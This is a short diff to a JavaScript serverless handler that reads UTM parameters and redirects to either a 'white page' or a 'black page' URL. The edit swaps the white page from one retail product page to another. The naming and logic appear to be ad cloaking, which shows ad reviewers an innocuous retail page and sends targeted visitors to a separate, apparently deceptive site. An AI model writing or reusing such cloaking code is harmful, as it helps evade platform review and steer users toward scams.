@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babylux.be/fr/porte-bebe-coya-cybex.html";
+    const whitePageURL = "https://www.la-botte.com/4DCGI/voir_us/CLARISSE-MOC-NAVY-WINE/";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,3 +26,4 @@ export default function handler(req, res) {
     res.end();
 
   }
+
